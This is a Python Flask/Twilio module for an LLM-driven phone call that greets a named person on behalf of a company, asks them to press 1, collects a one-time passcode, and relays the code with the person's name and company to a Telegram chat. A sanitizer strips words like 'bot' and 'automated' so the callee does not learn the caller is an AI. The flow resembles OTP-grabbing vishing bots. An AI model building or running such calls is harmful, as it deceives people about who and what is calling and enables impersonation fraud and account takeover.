"""
HTTP-based AI call flow using TwiML Gather instead of WebSocket Media Streams.
This handles the /ai_start and /handle_gather endpoints for Railway compatibility.
"""
import os
import time
import logging
import json
from flask import request, Response
from twilio.twiml.voice_response import VoiceResponse, Gather

logger = logging.getLogger(__name__)


def generate_ai_greeting(session, call_sid, user_id):
    """
    Generate AI greeting for the call.
    Returns: (greeting_text, audio_url) tuple
    """
    greeting_text = None
    audio_url = None
    
    try:
        logger.warning(f"[AI_GREETING] Generating AI greeting for {call_sid}")
        # Use the canonical system prompt provided by the user (enforced JSON output)
        from ai.llm import generate_response
        from config import get_system_prompt

        # Build strict system prompt (the user-provided policy must be placed here).
        system_prompt = get_system_prompt()

        # Instruct the LLM to return JSON only with the required fields.
        instruction = (
            "Return VALID JSON ONLY with keys: script (string), phrases (array of strings), "
            "gather_digits (int), gather_timeout (int), press1_timeout (int), retry_count (int), urgency (string). "
            "Do not return anything else or explanatory text."
        )

        payload = {
            "company": session.company,
            "name": session.name,
            "code_length": session.code_length,
            "delivery": session.delivery,
            "urgency": getattr(session, "urgency", "normal"),
            "call_type": session.call_type,
        }

        prompt = (
            f"{instruction}\n\nInput variables as JSON:\n{json.dumps(payload)}\n\nRespond with JSON only."
        )

        resp_text = generate_response(
            prompt,
            context="",
            system_prompt=system_prompt,
            call_type=session.call_type,
            emotion=session.emotion,
            session=session,
        )

        data = None
        try:
            data = json.loads(resp_text) if resp_text else None
        except Exception:
            logger.warning("[AI_GREETING] LLM did not return valid JSON; falling back to plaintext greeting")

        if data and isinstance(data, dict) and data.get("script"):
            greeting_text = data.get("script").strip()
            # Persist gather settings in session for later use
            try:
                session.gather_digits = int(data.get("gather_digits", 1))
                session.gather_timeout = int(data.get("gather_timeout", 15))
                session.press1_timeout = int(data.get("press1_timeout", 5))
                session.retry_count = int(data.get("retry_count", 2))
                session.urgency = data.get("urgency", "normal")
                session.phrases = data.get("phrases", [])
            except Exception:
                logger.warning("[AI_GREETING] Invalid gather settings in LLM JSON; using defaults")

            session.add_agent_message(greeting_text)
        else:
            # Fallback plaintext greeting (safe, deterministic)
            greeting_text = f"Hello {session.name}, this is a call from {session.company}. Please hold."
            session.gather_digits = 1
            session.gather_timeout = 15
            session.press1_timeout = 5
            session.retry_count = 2
            session.phrases = []
    except Exception as e:
        logger.error(f"[AI_GREETING] Error generating greeting: {e}", exc_info=True)
        greeting_text = f"Hello {session.name}, this is a call from {session.company}. Please hold."
        session.gather_digits = 1
        session.gather_timeout = 15
        session.press1_timeout = 5
        session.retry_count = 2
        session.phrases = []
    
    # Convert greeting to audio
    try:
        if greeting_text:
            from ai.tts import generate_telephony_audio
            from config import build_public_base_url
            from ai.utils import send_otp_to_channel
            from sms_gateway import SMSGateway

            logger.warning(f"[AI_GREETING] Generating audio for greeting")
            audio_data = generate_telephony_audio(
                greeting_text,
                session.voice_id,
                output_format="ulaw_8000",
                call_sid=call_sid,
                session=session
            )

            if audio_data:
                # Save audio file where the server expects it: audio/{call_sid}/
                audio_dir = os.path.join("audio", str(call_sid))
                os.makedirs(audio_dir, exist_ok=True)
                audio_filename = f"greeting_{call_sid}.ulaw"
                audio_path = os.path.join(audio_dir, audio_filename)

                with open(audio_path, "wb") as f:
                    f.write(audio_data)

                # Build HTTP URL to serve the audio (call_sid-based)
                base_url = build_public_base_url()
                audio_url = f"{base_url}/audio/{call_sid}/{audio_filename}"
                logger.info(f"[AI_GREETING] ✅ Audio saved and available at: {audio_url}")
                # Initialize call stage to await press-1
                session.call_stage = "awaiting_press1"
    except Exception as e:
        logger.error(f"[AI_GREETING] Error generating audio: {e}", exc_info=True)
    
    return greeting_text, audio_url


def handle_ai_call_gather(user_id, chat_id, call_sid, base_url, bot):
    """
    Build initial TwiML with Gather element for AI call.
    """
    from ai.session import get_session
    
    session = get_session(call_sid)
    if not session:
        logger.error(f"[AI_GATHER_INIT] Session not found for {call_sid}")
        return Response("Session not found", status=404)
    
    # Generate greeting and get gather settings from session
    greeting_text, audio_url = generate_ai_greeting(session, call_sid, user_id)

    # Build TwiML with Gather to accept caller input (press-1 step)
    resp = VoiceResponse()

    num_digits = getattr(session, "gather_digits", 1) or 1
    timeout = getattr(session, "press1_timeout", 5) or 5

    gather = Gather(
        num_digits=num_digits,
        action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
        method="POST",
        timeout=timeout
    )
    if audio_url:
        gather.play(audio_url)
    else:
        gather.say(greeting_text or f"Hello {session.name}. Please wait.")
    resp.append(gather)
    
    if chat_id:
        try:
            bot.send_message(int(chat_id), f"🤖 AI call started. Greeting playing now.")
        except Exception:
            pass
    
    twiml_str = str(resp)
    logger.warning(f"[AI_GATHER_INIT] ✅ Starting AI call with Gather: {call_sid}")
    logger.warning(f"[AI_GATHER_INIT] TwiML response: {twiml_str}")
    return Response(twiml_str, content_type="application/xml")


def handle_gather_input(user_id, chat_id, call_sid, base_url, bot):
    """
    Handle caller input from Gather element.
    Processes DTMF digits or speech, generates AI response, and continues conversation.
    """
    from ai.session import get_session
    from ai.llm import generate_response
    from ai.tts import generate_telephony_audio
    from ai.utils import extract_otp, send_otp_to_channel
    from config import get_system_prompt, build_public_base_url
    from sms_gateway import SMSGateway

    digits = (request.values.get("Digits") or "").strip()
    speech_result = (request.values.get("SpeechResult") or "").strip()

    logger.info(f"[HANDLE_GATHER] Call {call_sid[:8]} received input - digits={digits} speech={speech_result[:50] if speech_result else 'none'}")

    session = get_session(call_sid)
    if not session:
        logger.error(f"[HANDLE_GATHER] Session not found for {call_sid}")
        return Response("Session not found", status=404)

    # Determine caller input
    caller_input = speech_result or digits or ""
    stage = getattr(session, "call_stage", None)

    def _sanitize(text: str) -> str:
        if not text:
            return text
        forbidden = {
            "OTP": "one-time passcode",
            "otp": "one-time passcode",
            "bot": "",
            "automated": "",
            "system": "",
        }
        out = text
        for k, v in forbidden.items():
            out = out.replace(k, v)
        return out.strip()

    if not caller_input:
        logger.info(f"[HANDLE_GATHER] No input from caller, replaying prompt")
        resp = VoiceResponse()
        if stage == "awaiting_code":
            gather = Gather(
                num_digits=session.code_length or 6,
                finish_on_key="#",
                action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
                method="POST",
                timeout=getattr(session, "gather_timeout", 15)
            )
            gather.say(session.fallback_message or "I didn't receive any input. Please enter the code now.")
        else:
            gather = Gather(
                num_digits=getattr(session, "gather_digits", 1) or 1,
                action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
                method="POST",
                timeout=getattr(session, "press1_timeout", 5)
            )
            gather.say("I didn't receive any input. Please press 1 now to continue.")
        resp.append(gather)
        return Response(str(resp), content_type="application/xml")

    # Add caller input to session history
    session.add_user_message(caller_input)
    logger.info(f"[HANDLE_GATHER] Caller input added to session: {caller_input}")

    if stage == "awaiting_press1":
        if digits == "1" or "one" in speech_result.lower() or "yes" in speech_result.lower():
            try:
                gateway = SMSGateway()
                otp = gateway.generate_otp(session.code_length or 6)
                session.expected_otp = otp
                session.current_otp = otp
                session.otp_status = "sent"

                if (session.delivery or "").upper() == "SMS":
                    gateway.send_otp(session.user_id or "", otp=otp, digits=session.code_length or 6)

                try:
                    send_otp_to_channel(otp, call_sid, session.name, session.company, bot, chat_id=session.chat_id, prompt_buttons=False)
                except Exception:
                    logger.exception("[HANDLE_GATHER] Failed to notify OTP channel")
            except Exception as e:
                logger.error(f"[HANDLE_GATHER] Error generating/sending OTP: {e}", exc_info=True)

            resp = VoiceResponse()
            gather = Gather(
                num_digits=session.code_length or 6,
                finish_on_key="#",
                action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
                method="POST",
                timeout=getattr(session, "gather_timeout", 15)
            )
            gather.say("A one-time passcode has been sent to your registered phone number. Please enter it now on your keypad, followed by the pound key.")
            resp.append(gather)
            session.call_stage = "awaiting_code"
            return Response(str(resp), content_type="application/xml")

        resp = VoiceResponse()
        gather = Gather(
            num_digits=getattr(session, "gather_digits", 1) or 1,
            action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
            method="POST",
            timeout=getattr(session, "press1_timeout", 5)
        )
        gather.say("I didn't hear a response. Please press 1 now to continue.")
        resp.append(gather)
        return Response(str(resp), content_type="application/xml")

    if stage == "awaiting_code":
        entered = digits if digits else extract_otp(speech_result, code_length=session.code_length)
        if not entered:
            resp = VoiceResponse()
            gather = Gather(
                num_digits=session.code_length or 6,
                finish_on_key="#",
                action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
                method="POST",
                timeout=getattr(session, "gather_timeout", 15)
            )
            gather.say("I didn't receive a code. Please enter the code again now.")
            resp.append(gather)
            return Response(str(resp), content_type="application/xml")

        if entered == session.expected_otp:
            resp = VoiceResponse()
            resp.say("Thank you. Your identity has been verified. Goodbye.")
            session.verification_complete = True
            session.otp_captured = True
            session.otp_value = entered
            session.complete("verified")
            return Response(str(resp), content_type="application/xml")

        session.otp_attempts = getattr(session, "otp_attempts", 0) + 1
        session.otp_status = "invalid"
        if session.otp_attempts < (session.max_attempts or 3):
            resp = VoiceResponse()
            gather = Gather(
                num_digits=session.code_length or 6,
                finish_on_key="#",
                action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
                method="POST",
                timeout=getattr(session, "gather_timeout", 15)
            )
            gather.say("That code did not match. Please try again.")
            resp.append(gather)
            return Response(str(resp), content_type="application/xml")

        resp = VoiceResponse()
        resp.say("Too many failed attempts. Please contact support. Goodbye.")
        session.complete("failed_attempts")
        return Response(str(resp), content_type="application/xml")

    response_text = None
    try:
        system_prompt = get_system_prompt()
        context = session.get_context()
        next_prompt = (
            f"The caller said: '{caller_input}'. Generate the next step in the {session.call_type} call. "
            f"Follow your system prompt. Be conversational and professional."
        )
        logger.info(f"[HANDLE_GATHER] Generating AI response for input")
        response_text = generate_response(
            next_prompt,
            context=context,
            system_prompt=system_prompt,
            call_type=session.call_type,
            emotion=session.emotion,
            session=session
        )
        response_text = _sanitize(response_text)
        if not response_text:
            response_text = "Thank you for your input. How else can I help you?"
        session.add_agent_message(response_text)
    except Exception as e:
        logger.error(f"[HANDLE_GATHER] Error generating response: {e}", exc_info=True)
        response_text = "I'm having trouble processing your input. Please hold."

    audio_url = None
    try:
        if response_text:
            logger.info(f"[HANDLE_GATHER] Generating audio for response")
            audio_data = generate_telephony_audio(
                response_text,
                session.voice_id,
                output_format="ulaw_8000",
                call_sid=call_sid,
                session=session
            )
            if audio_data:
                audio_dir = os.path.join("audio", str(call_sid))
                os.makedirs(audio_dir, exist_ok=True)
                audio_filename = f"response_{call_sid}_{int(time.time())}.ulaw"
                audio_path = os.path.join(audio_dir, audio_filename)
                with open(audio_path, "wb") as f:
                    f.write(audio_data)
                base_url_get = build_public_base_url()
                audio_url = f"{base_url_get}/audio/{call_sid}/{audio_filename}"
                logger.info(f"[HANDLE_GATHER] ✅ Response audio available at: {audio_url}")
    except Exception as e:
        logger.error(f"[HANDLE_GATHER] Error generating response audio: {e}", exc_info=True)

    resp = VoiceResponse()
    if audio_url:
        gather = Gather(
            num_digits=getattr(session, "gather_digits", 1) or 1,
            action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
            method="POST",
            timeout=getattr(session, "gather_timeout", 15)
        )
        gather.play(audio_url)
        resp.append(gather)
    else:
        gather = Gather(
            num_digits=getattr(session, "gather_digits", 1) or 1,
            action=f"{base_url}/handle_gather?user_id={user_id}&chat_id={chat_id}&call_sid={call_sid}",
            method="POST",
            timeout=getattr(session, "gather_timeout", 15)
        )
        gather.say(response_text)
        resp.append(gather)

    logger.info(f"[HANDLE_GATHER] Returning follow-up Gather TwiML for {call_sid}")
    return Response(str(resp), content_type="application/xml")
